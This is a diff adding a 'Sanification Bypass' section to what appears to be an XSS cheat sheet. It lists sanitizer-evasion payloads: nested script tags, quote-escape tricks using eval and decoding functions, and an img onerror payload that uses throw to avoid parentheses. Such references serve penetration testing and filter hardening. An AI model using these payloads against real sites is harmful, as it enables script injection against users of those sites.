@@ -140,9 +140,30 @@ Function
 
 ### Sanification Bypass
 
+#### Remove tags
 
+```
+<scr<script>ipt>...</script>    #script might check only first instance
+<scr<iframe>ipt>...</script>    #recursive scripts might not start every iteration from the beginnig of the string
+```
 
+#### Escape quotes
 
+```
+eval(\'...\')            #the filter replaaces ' with \' so by adding \ we obtain \' --> \\'
+String.fromCharCode(...) #generate string from sequence of unicode hex chars
+unescape(/%78%u0073%73/.source)                  #decode escaped characters
+decodeURI(/alert(%22...%22)/.source)             #decode URL escaped chars
+decodeURIComponent(/alert(%22...%22)/.source)    #decode URL escaped chars
+```
+
+#### Escape parenthesis
+
+By invoking the throw function it is possible to encode the parenthesis characters. Since the payload is in a string it is possible to use all the obfuscation techniques described in the Keywords section
+
+```
+<img src=x onerror="window.onerror=eval;throw='alert\x28\x29'"
+```
 
 ## WAF Bypass
 
